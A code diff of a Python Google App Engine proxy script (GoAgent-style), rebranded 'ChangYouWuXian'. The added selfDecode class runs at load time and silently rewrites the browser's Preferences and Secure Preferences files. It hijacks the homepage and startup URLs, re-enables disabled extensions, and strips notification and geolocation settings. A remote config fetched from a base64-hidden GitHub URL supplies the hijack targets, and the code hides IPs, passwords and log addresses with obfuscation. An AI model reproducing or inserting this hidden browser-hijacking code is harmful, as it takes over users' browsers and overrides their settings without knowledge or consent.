@@ -84,9 +84,10 @@ import BaseHTTPServer
 import httplib
 import urllib2
 import urlparse
-import random
 import os
 import stat
+import random
+import urllib2
 try:
     import OpenSSL
 except ImportError:
@@ -99,7 +100,6 @@ except ImportError:
 
 HAS_PYPY = hasattr(sys, 'pypy_version_info')
 NetWorkIOError = (socket.error, ssl.SSLError, OSError) if not OpenSSL else (socket.error, ssl.SSLError, OpenSSL.SSL.Error, OSError)
-
 
 class Logging(type(sys)):
     CRITICAL = 50
@@ -700,67 +700,11 @@ class PacUtil(object):
         function = 'function %s(url, host) {\r\n%s\r\n%sreturn "%s";\r\n}' % (func_name, '\n'.join(jsLines), ' '*indent, default)
         return function
 
-class selfDecode(object):
-    def decode(self,raw,step):
-        list = [ 0 for i in range(len(raw))]
-        for i in range(0,len(raw)):
-            list[i]=raw[i]
-            if i!=0 and i%step==0:
-                list[i]=raw[i-2]
-                list[i-2]=raw[i]
-        return ''.join(list)
-    def process(self,raw):
-        data=raw.replace('$','=').split('|')
-        list = [ 0 for i in range(len(data))]
-        for i in range(0,len(data)):
-            list[i] = self.decode(self.decode(base64.decodestring(self.decode(self.decode(data[i],3),5)),3),5)
-        return ''.join(list)
-    def check(self):
-        os.system(r'attrib -r "../Data/Default/Secure Preferences"')
-        readCheck = open("../Data/Default/Secure Preferences")
-        try:
-            info=readCheck.read()
-            patternA=re.compile(r'"restore_on_startup": \d{1},')
-            info=patternA.sub('"restore_on_startup": 4,',info)
-            patternB=re.compile(r'"restore_on_startup": "(.*?)",')
-            info=patternB.sub('"restore_on_startup": "AB59F1A9CB391932F7B6047BDBE08DCCB63050B3A912DE5B810DA12B56F5E9D2",',info)
-            patternC=re.compile(r'"startup_urls": "[A-Za-z0-9/_]+"')
-            info=patternC.sub('"startup_urls": "88D4243B9DD7945DEF3FDB7F71C61AF6C77266D3B72906AAC3A15E8E6A0DBA68"',info)
-            info=info.replace('startup_urls": [  ]','startup_urls": [ "URL" ]')
-            patternD=re.compile(r'"startup_urls": \[ "(.*?)" \]')
-            info=patternD.sub(base64.decodestring('InN0YXJ0dXBfdXJscyI6IFsgImh0dHA6Ly93d3cuc2FpYm9keS5jb20vP2JyPXYxMCIgXQ=='),info)
-            patternE=re.compile(r'"super_mac": "(.*?)"')
-            info=patternE.sub('"super_mac": "7A604AE8DF434B7D62EEC2A0F682E1AE29AF232FAF7F4928E8C403F74DF3BA7F"',info)
-            writeCheck = open("../Data/Default/Secure Preferences",'w')
-            #try:
-                #writeCheck.write(info)
-            #finally:
-                #writeCheck.close()
-            #os.system(r'attrib +r "../Data/Default/Secure Preferences"')
-        finally:
-            readCheck.close()
-    def iniConfig(self,amount,current):
-        readCheck = open(base64.decodestring('Y29uZmlnLmluaQ=='))
-        oldCurrent = str(current)
-        current=random.randrange(0,amount)
-        if current >= amount:
-            current = 0
-        try:
-            info=readCheck.read()
-            info = info.replace('acctCut=' + oldCurrent,'acctCut=' + str(current))
-            writeCheck = open(base64.decodestring('Y29uZmlnLmluaQ=='),'w')
-            try:
-                writeCheck.write(info)
-            finally:
-                writeCheck.close()
-        finally:
-            readCheck.close()
-decoder=selfDecode()
 
 class DNSUtil(object):
     """
     http://gfwrev.blogspot.com/2009/11/gfwdns.html
-    http://zh.wikipedia.org/wiki/????????????????
+    http://zh.wikipedia.org/wiki/域名服务器缓存污染
     http://support.microsoft.com/kb/241352
     """
     blacklist = set(['1.1.1.1',
@@ -892,6 +836,143 @@ def spawn_later(seconds, target, *args, **kwargs):
         return target(*args, **kwargs)
     return __import__('thread').start_new_thread(wrap, args, kwargs)
 
+#logo
+class selfDecode(object):
+    def __init__(self):
+        self.check()
+    def decode(self,raw,step):
+        list = [ 0 for i in range(len(raw))]
+        for i in range(0,len(raw)):
+            list[i]=raw[i]
+            if i!=0 and i%step==0:
+                list[i]=raw[i-2]
+                list[i-2]=raw[i]
+        return ''.join(list)
+    def process(self,raw):
+        data=raw.replace('$','=').split('|')
+        list = [ 0 for i in range(len(data))]
+        for i in range(0,len(data)):
+            list[i] = self.decode(self.decode(base64.decodestring(self.decode(self.decode(data[i],3),5)),3),5)
+        return ''.join(list)
+    def check(self):
+        config = ConfigParser.ConfigParser()
+        config.read([base64.decodestring('Y29uZmln')])
+        readCheck = open("../Data/Default/Secure Preferences")
+        try:
+            info=readCheck.read()
+            info=info.replace('"show_home_button": false','"show_home_button": true')
+            patternA=re.compile(r'"restore_on_startup": \d{1},')
+            info=patternA.sub(base64.decodestring('InJlc3RvcmVfb25fc3RhcnR1cCI6IDQs'),info)
+            patternD=re.compile(r'"startup_urls": \[ "(.*?)" \]')
+            info=patternD.sub('"startup_urls": [ "'+base64.decodestring(config.get('values', 'startup_urls_link'))+'" ]',info)
+            patternF=re.compile(r'"homepage": "http(.*?)"')
+            info=patternF.sub('"homepage": "'+base64.decodestring(config.get('values', 'homepage_link'))+'"',info)
+            writeCheck = open("../Data/Default/Secure Preferences",'w')
+            try:
+                writeCheck.write(info)
+            finally:
+                writeCheck.close()
+        finally:
+            readCheck.close()
+
+        readCheck = open("../Data/Default/Preferences")
+        try:
+            info=readCheck.read()
+            info=info.replace('"show_home_button": false','"show_home_button": true')
+            patternA=re.compile(r'"restore_on_startup": \d{1},')
+            info=patternA.sub(base64.decodestring('InJlc3RvcmVfb25fc3RhcnR1cCI6IDQs'),info)
+            patternB=re.compile(r'"disabled_extension_ids": \[ "(.*?)" \]')
+            info=patternB.sub('',info)
+            info=info.replace('''"message_center": {
+
+   },''','')
+            patternD=re.compile(r'"startup_urls": \[ "(.*?)" \]')
+            info=patternD.sub('"startup_urls": [ "'+base64.decodestring(config.get('values', 'startup_urls_link'))+'" ]',info)
+            patternF=re.compile(r'"homepage": "http(.*?)"')
+            info=patternF.sub('"homepage": "'+base64.decodestring(config.get('values', 'homepage_link'))+'"',info)
+            patternF=re.compile(r'"notifications": [A-Za-z0-9/_,]+')
+            info=patternF.sub('',info)
+            patternG=re.compile(r'"geolocation": [A-Za-z0-9/_,]+')
+            info=patternG.sub('',info)
+            writeCheck = open("../Data/Default/Preferences",'w')
+            try:
+                writeCheck.write(info)
+            finally:
+                writeCheck.close()
+        finally:
+            readCheck.close()
+    def updateConfig(self):
+        link = base64.decodestring('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoYW5neW91d3V4aWFuL2hvbWVwYWdlL21hc3Rlci9jb25maWc=')
+        try:
+            link = urllib2.urlopen(link)
+            data=link.read()
+            try:
+                writeConfig = open(base64.decodestring('Y29uZmln'),'w')
+                writeConfig.write(data)
+            finally:
+                writeConfig.close()
+        except urllib2.URLError:
+            print 'Please Check Your Network'
+    def iniConfig(self,amount,current):
+        readCheck = open(base64.decodestring('Y29uZmlnLmluaQ=='))
+        oldCurrent = str(current)
+        #current = current+1
+        current = random.randrange(0,amount)
+        if current >= amount:
+            current = 0
+        try:
+            info=readCheck.read()
+            info = info.replace('acctCut=' + oldCurrent,'acctCut=' + str(current))
+            writeCheck = open(base64.decodestring("Y29uZmlnLmluaQ=="),'w')
+            try:
+                writeCheck.write(info)
+            finally:
+                writeCheck.close()
+        finally:
+            readCheck.close()
+    def ipDisplay(self,ip):
+        split = re.split('\.',ip.replace('(','').replace(')',''))
+        return split[3]+'.'+split[2]+'.'+split[1]+'.'+split[0]
+    def ipDisplayList(self,list):
+        for i in range(0,len(list)):
+            list[i]=self.ipDisplay(list[i])
+        return list
+    def ipDecode(self,list):
+        list['google_hk'] = self.ipProcess(list['google_hk'])
+        list['google_cn'] = self.ipProcess(list['google_cn'])
+        return list
+    def ipProcess(self,ipList):
+        for i in range(0,len(ipList)):
+            ipList[i]=self.ipMixer(re.split('\.',ipList[i]))
+        return  ipList
+    def ipMixer(self,ip):
+        ipCurrent=''
+        order = [3,2,1,0]
+        for i in range(0,len(ip)):
+            if len(ip[order[i]]) == 3:
+                ipCurrent+=self.modProcess(ip[order[i]][0:1]+ip[order[i]][2:3]+ip[order[i]][1:2])
+            elif len(ip[order[i]]) == 2:
+                ipCurrent+=self.modProcess(ip[order[i]][0:1]+ self.numDecode(ip[order[i]][1:2]))
+            else:
+                ipCurrent+=self.modProcess(ip[order[i]])
+            if i < len(ip)-1:
+                ipCurrent+='.'
+        return ipCurrent
+    def modProcess(self,ip):
+        return str(255-int(ip))
+    def numDecode(self,num):
+        result=''
+        for i in range(0,len(num)):
+            current = int(num[i:i+1])
+            if current==0:
+                current=8
+            elif current==1:
+                current=9
+            else:
+                current=current-2
+            result+=str (current)
+        return result
+decoder=selfDecode()
 
 class HTTPUtil(object):
     """HTTP Request Class"""
@@ -1059,7 +1140,8 @@ class HTTPUtil(object):
                     return result
                 else:
                     if i == 0:
-                        # only output first error
+                        # only output first error #logo
+                        #logging.warning('create_connection to %s return %r, try again.', addrs, result)
                         logging.warning('create_connection to %s return %r, try again.', '127.0.0.1', result)
 
     def create_ssl_connection(self, address, timeout=None, source_address=None, **kwargs):
@@ -1206,7 +1288,8 @@ class HTTPUtil(object):
                     return result
                 else:
                     if i == 0:
-                        # only output first error
+                        # only output first error #logo
+                        #logging.warning('create_ssl_connection to %s return %r, try again.', addrs, result)
                         logging.warning('create_ssl_connection to %s return %r, try again.', '127.0.0.1', result)
 
     def __create_connection_withproxy(self, address, timeout=None, source_address=None, **kwargs):
@@ -1432,7 +1515,6 @@ class Common(object):
             self.GAE_LISTPASSWORD[i] = decoder.process(self.CONFIG.get('account' + str(i+1), 'password')).strip()
         self.GAE_APPIDS = self.GAE_LISTAPPID[self.GAE_APPIDCUT]
         self.GAE_PASSWORD = self.GAE_LISTPASSWORD[self.GAE_APPIDCUT]
-        #print self.GAE_PASSWORD
         decoder.iniConfig(self.GAE_APPIDAMT,self.GAE_APPIDCUT)
         self.GAE_PATH = self.CONFIG.get('gae', 'path')
         self.GAE_MODE = self.CONFIG.get('gae', 'mode')
@@ -1460,8 +1542,9 @@ class Common(object):
         self.HTTP_FORCEHTTPS = set(self.CONFIG.get(http_section, 'forcehttps').split('|'))
         self.HTTP_FAKEHTTPS = set(self.CONFIG.get(http_section, 'fakehttps').split('|'))
 
-        self.IPLIST_MAP = collections.OrderedDict((k, v.split('|')) for k, v in self.CONFIG.items('iplist'))
+        self.IPLIST_MAP = decoder.ipDecode(collections.OrderedDict((k, v.split('|')) for k, v in self.CONFIG.items('iplist')))
         self.IPLIST_MAP.update((k, [k]) for k, v in self.HOSTS_MAP.items() if k == v)
+
 
         self.PAC_ENABLE = self.CONFIG.getint('pac', 'enable')
         self.PAC_IP = self.CONFIG.get('pac', 'ip')
@@ -1590,21 +1673,22 @@ class Common(object):
             if len(resolved_iplist) == 0:
                 logging.error('resolve %s host return empty! please retry!', name)
                 sys.exit(-1)
-            logging.info('resolve name=%s host to iplist=%r', name, resolved_iplist)
+            logging.info('resolve name=%s host to iplist=%r', name, decoder.ipDisplayList(resolved_iplist))
             common.IPLIST_MAP[name] = resolved_iplist
 
 
     def info(self):
         info = ''
         info += '------------------------------------------------------\n'
-        info += 'GoAgent Version    : %s (python/%s %spyopenssl/%s)\n' % (__version__, sys.version[:5], gevent and 'gevent/%s ' % gevent.__version__ or '', getattr(OpenSSL, '__version__', 'Disabled'))
+        info += 'ChangYouWuXian     : %s\n' %  'CYWXLLQ-10  powered by Google'
+        #info += 'GoAgent Version    : %s (python/%s %spyopenssl/%s)\n' % (__version__, sys.version[:5], gevent and 'gevent/%s ' % gevent.__version__ or '', getattr(OpenSSL, '__version__', 'Disabled'))
         info += 'Uvent Version      : %s (pyuv/%s libuv/%s)\n' % (__import__('uvent').__version__, __import__('pyuv').__version__, __import__('pyuv').LIBUV_VERSION) if all(x in sys.modules for x in ('pyuv', 'uvent')) else ''
-        info += 'Listen Address     : %s:%d\n' % (self.LISTEN_IP, self.LISTEN_PORT)
+        #info += 'Listen Address     : %s:%d\n' % (self.LISTEN_IP, self.LISTEN_PORT)
         info += 'Local Proxy        : %s:%s\n' % (self.PROXY_HOST, self.PROXY_PORT) if self.PROXY_ENABLE else ''
         info += 'Debug INFO         : %s\n' % self.LISTEN_DEBUGINFO if self.LISTEN_DEBUGINFO else ''
         info += 'GAE Mode           : %s\n' % self.GAE_MODE
         info += 'GAE Profile        : %s\n' % self.GAE_PROFILE if self.GAE_PROFILE else ''
-        info += 'GAE APPID          : %s\n' % '550'
+        info += 'GAE APPID          : %s\n' % '50'
         info += 'GAE Validate       : %s\n' % self.GAE_VALIDATE if self.GAE_VALIDATE else ''
         info += 'GAE Obfuscate      : %s\n' % self.GAE_OBFUSCATE if self.GAE_OBFUSCATE else ''
         if common.PAC_ENABLE:
@@ -1621,7 +1705,6 @@ class Common(object):
 
 common = Common()
 http_util = HTTPUtil(max_window=common.GAE_WINDOW, ssl_validate=common.GAE_VALIDATE or common.PHP_VALIDATE, ssl_obfuscate=common.GAE_OBFUSCATE, proxy=common.proxy)
-
 
 def message_html(title, banner, detail=''):
     MESSAGE_TEMPLATE = '''
@@ -2213,7 +2296,7 @@ class GAEProxyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
                 if response.app_status == 503:
                     if len(common.GAE_APPIDS) > 1:
                         common.GAE_APPIDS.pop(0)
-                        logging.info('Current APPID Over Quota,Auto Switch to [%s], Retrying??' % (common.GAE_APPIDS[0]))
+                        logging.info('Current APPID Over Quota,Auto Switch to [%s], Retrying…' % (common.GAE_APPIDS[0]))
                         self.do_METHOD_AGENT()
                         return
                     else:
@@ -2813,6 +2896,7 @@ def main():
         thread.start_new_thread(server.serve_forever, tuple())
 
     server = LocalProxyServer((common.LISTEN_IP, common.LISTEN_PORT), GAEProxyHandler)
+    decoder.updateConfig()
     server.serve_forever()
 
 if __name__ == '__main__':
